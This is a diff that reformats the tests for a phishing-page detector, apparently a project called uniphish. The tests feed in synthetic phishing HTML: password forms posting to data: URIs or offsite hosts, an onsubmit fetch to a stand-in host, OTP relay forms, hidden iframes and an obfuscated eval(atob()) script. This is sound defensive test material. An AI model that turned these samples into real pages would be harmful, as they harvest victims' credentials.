@@ -13,8 +13,9 @@ from uniphish.core.types import Artifact, ArtifactKind, BrandMatch
 from uniphish.page.favicon import favicon_mmh3
 
 
-def run(html: str, url: str | None = None, ctx: AnalysisContext | None = None,
-        **meta) -> AnalyzerResult:
+def run(
+    html: str, url: str | None = None, ctx: AnalysisContext | None = None, **meta
+) -> AnalyzerResult:
     art = Artifact.from_page(html, url, **meta)
     return PageAnalyzer().analyze_sync(art, ctx or AnalysisContext(options=AnalysisOptions()))
 
@@ -76,8 +77,10 @@ def test_relative_action_resolves_same_origin_even_without_signals():
 
 
 def test_data_uri_password_form():
-    html = ('<form action="data:text/html;base64,PGh0bWw+" method="post">'
-            '<input type="password" name="p"></form>')
+    html = (
+        '<form action="data:text/html;base64,PGh0bWw+" method="post">'
+        '<input type="password" name="p"></form>'
+    )
     res = run(html, "https://login-portal.test/")
     s = sig(res, "page.form.password_data_uri")
     assert s.weight == 5.0
@@ -86,15 +89,19 @@ def test_data_uri_password_form():
 
 
 def test_offsite_js_submit_with_password():
-    html = ('<form action="/x" onsubmit="fetch(\'https://c.example.net/\',{method:\'POST\'});'
-            'return false"><input type="password" name="p"></form>')
+    html = (
+        "<form action=\"/x\" onsubmit=\"fetch('https://c.example.net/',{method:'POST'});"
+        'return false"><input type="password" name="p"></form>'
+    )
     res = run(html, "https://login-portal.test/")
     assert sig(res, "page.form.password_offsite_js").weight == 3.0
 
 
 def test_otp_form_offsite_without_password():
-    html = ('<form action="https://relay.example.net/otp" method="post">'
-            '<input name="otp_code"><button>Verify</button></form>')
+    html = (
+        '<form action="https://relay.example.net/otp" method="post">'
+        '<input name="otp_code"><button>Verify</button></form>'
+    )
     res = run(html, "https://login-portal.test/")
     s = sig(res, "page.form.otp_offsite")
     assert s.weight == 2.5 and "T1111" in s.mitre
@@ -107,8 +114,10 @@ def test_otp_form_same_origin_ignored():
 
 
 def test_non_credential_offsite_form_ignored():
-    res = run('<form action="https://news.example.net/s"><input name="q"></form>',
-              "https://login-portal.test/")
+    res = run(
+        '<form action="https://news.example.net/s"><input name="q"></form>',
+        "https://login-portal.test/",
+    )
     assert ids(res) == set()
 
 
@@ -125,11 +134,15 @@ def test_brand_content_mismatch_with_credential_form():
 
 
 def test_brand_mismatch_text_only_needs_login_context():
-    blog = ("<html><head><title>Fees explained</title></head><body><p>PayPal charges fees "
-            "for some payments, here is how they work.</p></body></html>")
+    blog = (
+        "<html><head><title>Fees explained</title></head><body><p>PayPal charges fees "
+        "for some payments, here is how they work.</p></body></html>"
+    )
     assert "brand.content_mismatch" not in ids(run(blog, "https://blog.test/"))
-    login = ("<html><head><title>Account</title></head><body><h1>PayPal</h1>"
-             "<p>Sign in to continue</p></body></html>")
+    login = (
+        "<html><head><title>Account</title></head><body><h1>PayPal</h1>"
+        "<p>Sign in to continue</p></body></html>"
+    )
     s = sig(run(login, "https://blog.test/"), "brand.content_mismatch")
     assert 0.5 <= s.confidence < 0.9
 
@@ -141,28 +154,36 @@ def test_title_only_brand_mention_has_low_confidence():
 
 
 def test_social_login_buttons_are_not_impersonation():
-    html = ("<html><head><title>Acme login</title></head><body><h1>Acme</h1>"
-            "<form action='/s'><input type='password' name='p'></form>"
-            "<a>Sign in with Google</a><a>Continue with Facebook</a></body></html>")
+    html = (
+        "<html><head><title>Acme login</title></head><body><h1>Acme</h1>"
+        "<form action='/s'><input type='password' name='p'></form>"
+        "<a>Sign in with Google</a><a>Continue with Facebook</a></body></html>"
+    )
     assert "brand.content_mismatch" not in ids(run(html, "https://acme.test/login"))
 
 
 def test_og_site_name_counts_as_brand_reference():
-    html = ('<html><head><title>Login</title><meta property="og:site_name" content="PayPal">'
-            "</head><body><input type='password'></body></html>")
-    assert sig(run(html, "https://x.test/"), "brand.content_mismatch").evidence["found_in"] \
-        == "title"
+    html = (
+        '<html><head><title>Login</title><meta property="og:site_name" content="PayPal">'
+        "</head><body><input type='password'></body></html>"
+    )
+    assert (
+        sig(run(html, "https://x.test/"), "brand.content_mismatch").evidence["found_in"] == "title"
+    )
 
 
 def test_no_url_means_no_content_mismatch():
-    html = ("<html><head><title>PayPal login</title></head>"
-            "<body><input type='password'></body></html>")
+    html = (
+        "<html><head><title>PayPal login</title></head><body><input type='password'></body></html>"
+    )
     assert "brand.content_mismatch" not in ids(run(html, None))
 
 
 def test_official_domain_gets_consistent_branding_credit():
-    html = ("<html><head><title>PayPal - Log in</title></head><body>"
-            "<form action='/signin'><input type='password'></form></body></html>")
+    html = (
+        "<html><head><title>PayPal - Log in</title></head><body>"
+        "<form action='/signin'><input type='password'></form></body></html>"
+    )
     res = run(html, "https://www.paypal.com/signin")
     s = sig(res, "page.brand_consistent")
     assert s.weight == -1.0
@@ -172,23 +193,28 @@ def test_official_domain_gets_consistent_branding_credit():
 
 
 def test_same_brand_cdn_form_target_not_cross_origin_alert():
-    html = ("<html><head><title>PayPal</title></head><body>"
-            "<form action='https://www.paypalobjects.com/x'><input type='password'></form>"
-            "</body></html>")
+    html = (
+        "<html><head><title>PayPal</title></head><body>"
+        "<form action='https://www.paypalobjects.com/x'><input type='password'></form>"
+        "</body></html>"
+    )
     assert "page.form.password_cross_origin" not in ids(run(html, "https://www.paypal.com/"))
 
 
 def test_lots_host_gets_no_consistent_branding_credit():
-    html = ("<html><head><title>PayPal login</title></head>"
-            "<body><input type='password'></body></html>")
+    html = (
+        "<html><head><title>PayPal login</title></head><body><input type='password'></body></html>"
+    )
     res = run(html, "https://phish-demo.pages.dev/")
     assert "page.brand_consistent" not in ids(res)
     assert sig(res, "brand.content_mismatch").evidence["lots_host"]
 
 
 def test_top_site_mentioning_brand_is_exempt():
-    html = ("<html><head><title>PayPal login help</title></head>"
-            "<body><input type='password'></body></html>")
+    html = (
+        "<html><head><title>PayPal login help</title></head>"
+        "<body><input type='password'></body></html>"
+    )
     assert "brand.content_mismatch" not in ids(run(html, "https://www.wikipedia.org/"))
 
 
@@ -196,8 +222,9 @@ def test_url_analyzer_agreement_boosts_confidence():
     html = "<html><head><title>PayPal</title></head><body>Hello</body></html>"
     base = sig(run(html, "https://pp-secure.test/"), "brand.content_mismatch").confidence
     ctx = AnalysisContext(options=AnalysisOptions())
-    ctx.results["url"] = AnalyzerResult(brand=BrandMatch(
-        brand="paypal", name="PayPal", technique="combosquat", confidence=0.8))
+    ctx.results["url"] = AnalyzerResult(
+        brand=BrandMatch(brand="paypal", name="PayPal", technique="combosquat", confidence=0.8)
+    )
     s = sig(run(html, "https://pp-secure.test/", ctx), "brand.content_mismatch")
     assert s.confidence > base and s.evidence["url_analyzer_agrees"]
 
@@ -205,12 +232,20 @@ def test_url_analyzer_agreement_boosts_confidence():
 def test_favicon_mismatch_via_injected_table():
     icon = b"\x00synthetic-icon-bytes"
     table = {str(favicon_mmh3(icon)): "paypal"}
-    res = run("<html><head><title>Hi</title></head><body></body></html>", "https://x.test/",
-              favicon_bytes=icon, favicon_table=table)
+    res = run(
+        "<html><head><title>Hi</title></head><body></body></html>",
+        "https://x.test/",
+        favicon_bytes=icon,
+        favicon_table=table,
+    )
     s = sig(res, "brand.favicon_mismatch")
     assert s.weight == 3.0 and s.evidence["brand"] == "paypal"
-    ok = run("<html><body></body></html>", "https://www.paypal.com/", favicon_bytes=icon,
-             favicon_table=table)
+    ok = run(
+        "<html><body></body></html>",
+        "https://www.paypal.com/",
+        favicon_bytes=icon,
+        favicon_table=table,
+    )
     assert "brand.favicon_mismatch" not in ids(ok)
 
 
@@ -235,8 +270,10 @@ def test_clipboard_write_clickfix():
 
 
 def test_clipboard_write_without_lure_is_low_confidence():
-    html = ("<html><body><button onclick=\"navigator.clipboard.writeText('x')\">Copy</button>"
-            "</body></html>")
+    html = (
+        "<html><body><button onclick=\"navigator.clipboard.writeText('x')\">Copy</button>"
+        "</body></html>"
+    )
     res = run(html, "https://docs.example.com/")
     c = sig(res, "page.clipboard_write")
     assert c.confidence <= 0.5
@@ -244,10 +281,16 @@ def test_clipboard_write_without_lure_is_low_confidence():
 
 
 def test_obfuscated_script_signal():
-    blob = "Zm9v" + "".join("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[
-        (i * 37 + i // 7 * 13) % 64] for i in range(1800))
-    html = (f"<html><body><input type='password'><script>var a='{blob}';"
-            "eval(atob(a));eval(atob(a));eval(atob(a));</script></body></html>")
+    blob = "Zm9v" + "".join(
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[
+            (i * 37 + i // 7 * 13) % 64
+        ]
+        for i in range(1800)
+    )
+    html = (
+        f"<html><body><input type='password'><script>var a='{blob}';"
+        "eval(atob(a));eval(atob(a));eval(atob(a));</script></body></html>"
+    )
     res = run(html, "https://x.test/")
     s = sig(res, "page.obfuscated_script")
     assert s.weight == 2.0 and "T1027" in s.mitre and s.confidence == 1.0
@@ -260,12 +303,15 @@ def test_plain_script_not_flagged():
 
 
 def test_meta_refresh_offsite_creates_child():
-    html = ('<html><head><meta http-equiv="refresh" content="0;url=https://next.example.net/a">'
-            "</head><body>Redirecting</body></html>")
+    html = (
+        '<html><head><meta http-equiv="refresh" content="0;url=https://next.example.net/a">'
+        "</head><body>Redirecting</body></html>"
+    )
     res = run(html, "https://hop.test/")
     assert sig(res, "page.meta_refresh_offsite").weight == 1.5
     assert [(c.origin, c.url) for c in res.children] == [
-        ("page.refresh", "https://next.example.net/a")]
+        ("page.refresh", "https://next.example.net/a")
+    ]
 
 
 def test_meta_refresh_same_site_ignored():
@@ -274,8 +320,10 @@ def test_meta_refresh_same_site_ignored():
 
 
 def test_hidden_iframe_offsite():
-    html = ('<body><iframe src="https://frame.example.net/x" style="display:none"></iframe>'
-            '<iframe src="https://visible.example.net/"></iframe></body>')
+    html = (
+        '<body><iframe src="https://frame.example.net/x" style="display:none"></iframe>'
+        '<iframe src="https://visible.example.net/"></iframe></body>'
+    )
     res = run(html, "https://hop.test/")
     s = sig(res, "page.iframe_hidden_offsite")
     assert s.weight == 2.0 and s.evidence["hosts"] == ["frame.example.net"]
@@ -293,8 +341,10 @@ def test_script_children_only_for_interesting_hosts_and_capped():
 
 
 def test_children_deduplicated():
-    html = ('<form action="https://c.example.net/p"><input type="password"></form>'
-            '<form action="https://c.example.net/p"><input type="password"></form>')
+    html = (
+        '<form action="https://c.example.net/p"><input type="password"></form>'
+        '<form action="https://c.example.net/p"><input type="password"></form>'
+    )
     res = run(html, "https://x.test/")
     assert len(res.children) == 1
 
@@ -314,9 +364,12 @@ def test_engine_integration():
     assert verdict.meta.get("forms") == 1
 
 
-@pytest.mark.parametrize("html", [
-    "<form action='https://a.example.net'><input type=password></form>" * 3,
-])
+@pytest.mark.parametrize(
+    "html",
+    [
+        "<form action='https://a.example.net'><input type=password></form>" * 3,
+    ],
+)
 def test_multiple_forms_single_signal(html):
     res = run(html, "https://x.test/")
     assert [s.id for s in res.signals].count("page.form.password_cross_origin") == 1
